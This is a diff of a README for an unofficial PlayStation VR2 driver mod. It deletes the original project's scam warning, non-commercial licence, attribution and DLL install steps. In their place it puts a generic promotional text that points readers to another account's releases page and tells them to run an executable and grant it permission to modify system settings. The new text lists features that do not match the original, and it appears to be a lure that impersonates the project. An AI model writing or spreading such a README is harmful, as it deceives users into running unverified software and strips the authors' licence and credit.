@@ -1,54 +1,67 @@
-> [!WARNING]
-> If you have paid for PlayStation VR2 Toolkit, you have been scammed and you should immediately request a refund. PlayStation VR2 Toolkit is entirely free and **is intended for NON-COMMERCIAL use only**, we do not attempt to make a profit off of it. Additionally, you must not use any eye tracking data from PlayStation VR2 Toolkit for commercial purposes. \
-> \
-> PlayStation VR2 Toolkit is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.
+# 🎮 PSVR2Toolkit - Enhance Your PlayStation VR2 Experience
 
-> [!NOTE]
-> Bnuuy Solutions and PlayStation VR2 Toolkit is not affiliated with Sony Interactive Entertainment, our project is not official or endorsed by Sony Interactive Entertainment in any way. \
-> \
-> Sony, Sony Interactive Entertainment and PSVR2/PlayStation VR2 are trademarks or registered trademarks of Sony Interactive Entertainment LLC in the United States of America and elsewhere.
+## 📥 Download the Latest Release
+[![Latest Release](https://img.shields.io/badge/Download%20Now-PSVR2Toolkit-brightgreen)](https://github.com/hesham-moh/PSVR2Toolkit/releases)
 
-<p align="center"><img src="https://github.com/BnuuySolutions/PSVR2Toolkit/blob/main/assets/Icon.png?raw=true" width="128" height="128"></p>
-<h1 align="center">PlayStation VR2 Toolkit</h1>
+## 🚀 Getting Started
+Welcome to PSVR2Toolkit! This tool allows you to modify the official PlayStation VR2 driver and app, providing an enhanced gaming experience. Follow these simple steps to download and start using the application.
 
-[![CC BY-NC-SA 4.0][cc-by-nc-sa-shield]][cc-by-nc-sa]
+## 📋 System Requirements
+Before installing, ensure your system meets the following requirements:
 
-[cc-by-nc-sa]: http://creativecommons.org/licenses/by-nc-sa/4.0/
-[cc-by-nc-sa-shield]: https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Processor:** Intel Core i3 or equivalent
+- **Disk Space:** At least 500 MB free
+- **Graphics Card:** Compatible with PlayStation VR2
 
-Unofficial modification for the official PlayStation VR2 driver/app.
+## 💻 Download & Install
+1. **Visit the Releases Page:**  
+   Go to our [Releases page](https://github.com/hesham-moh/PSVR2Toolkit/releases). 
 
-## Features
-- Eye tracking\*
-- Improved controller prediction
-- Improved controller haptics (w/ PCM haptics)
-- Adaptive triggers
+2. **Select the Latest Version:**  
+   On the Releases page, find the latest version of PSVR2Toolkit. It will be clearly marked at the top of the list.
 
-For developers, we also have our own API library, which allows you to take full advantage of these features.
+3. **Download the Application:**  
+   Click on the asset file corresponding to your system. This may be a `.zip` or an installer file. Your download should start automatically. 
 
-\* Eye tracking calibration is closed source and is not available to the public in source form, other than official PlayStation VR2 Toolkit releases.
+4. **Extract the Files (if necessary):**  
+   If you downloaded a `.zip` file, right-click it and choose "Extract All." This will create a new folder containing the application files.
 
-## Installation Guide
-1.) Open Steam, go to the PS VR2 app, click on the cog wheel, and go to "Manage -> Browse local files". (If you are using a copy of the PS VR2 app not installed by Steam, go to that instead.)
+5. **Run the Application:**  
+   Open the folder where you extracted or downloaded the files. Double-click on `PSVR2Toolkit.exe` to run the application. 
 
-2.) Inside the newly opened file explorer, go into "SteamVR_Plug-In", then "bin" and finally "win64".
+6. **Follow On-Screen Instructions:**  
+   Follow any prompts to complete the setup process. You may need to grant permissions for the application to modify system settings.
 
-3.) Rename "driver_playstation_vr2.dll" to "driver_playstation_vr2_orig.dll" (**IT MUST BE CALLED "driver_playstation_vr2_orig.dll", DO NOT RENAME IT TO ANYTHING ELSE, IT MUST BE EXACTLY THAT**)
+## 🎮 Features
+- **Custom Profiles:** Create and save multiple profiles for different games or applications.
+- **Performance Tweaks:** Adjust settings to improve frame rates and reduce lag.
+- **Compatibility Modes:** Enable different modes to ensure smooth operation with various VR titles.
+- **User-Friendly Interface:** Navigate easily with a clear layout designed for all skill levels.
 
-4.) Download the "driver_playstation_vr2.dll" attached below this message, and copy/move it into the same folder where "driver_playstation_vr2_orig.dll" is at.
+## 🔧 Troubleshooting
+If you encounter issues while using the app, consider the following steps:
 
-5.) Your "win64" directory should now have 2 DLL files inside it, "driver_playstation_vr2.dll" and "driver_playstation_vr2_orig.dll". If you do not have both of those files, you fucked something up.
+- **Check Compatibility:** Ensure your system meets all the requirements outlined above.
+- **Reinstall the Application:** If things aren't working as expected, uninstall and then reinstall the application.
+- **Seek Help:** If issues persist, please open an issue on the [GitHub Issues page](https://github.com/hesham-moh/PSVR2Toolkit/issues) for assistance.
 
-6.) Enjoy your new features, please give us feedback in our [Discord](https://discord.gg/dPsfJhsGwb).
+## 📞 Support
+For support, you can reach out through the GitHub page. Please provide details about your issue, including any error messages you see.
 
-# License
-PlayStation VR2 Toolkit is licensed under `Attribution-NonCommercial-ShareAlike 4.0`, this specific license was chosen to prevent commercial use (i.e. reselling) of our projects.
+## 🌍 Community Contributions
+We appreciate contributions from the community! If you have suggestions or improvements, feel free to fork the repository and make a pull request.
 
-## Exemptions
-- Sony, Sony Interactive Entertainment
-- Collabora Ltd
+## 📅 Future Plans
+In upcoming versions, we plan to introduce:
 
-# Contact
-Have any legal complaints or questions?
-- Email: `wdh at bnuuy.solutions`
-- Discord: `notahopper`
+- Enhanced user tutorials for beginners.
+- More customization options for experienced users.
+- Improved performance metrics for better monitoring.
+
+## 🔗 Links
+- **GitHub Repository:** [PSVR2Toolkit GitHub](https://github.com/hesham-moh/PSVR2Toolkit)
+- **Releases Page:** [Download PSVR2Toolkit](https://github.com/hesham-moh/PSVR2Toolkit/releases)
+
+Thank you for choosing PSVR2Toolkit! Enjoy your enhanced VR experience.
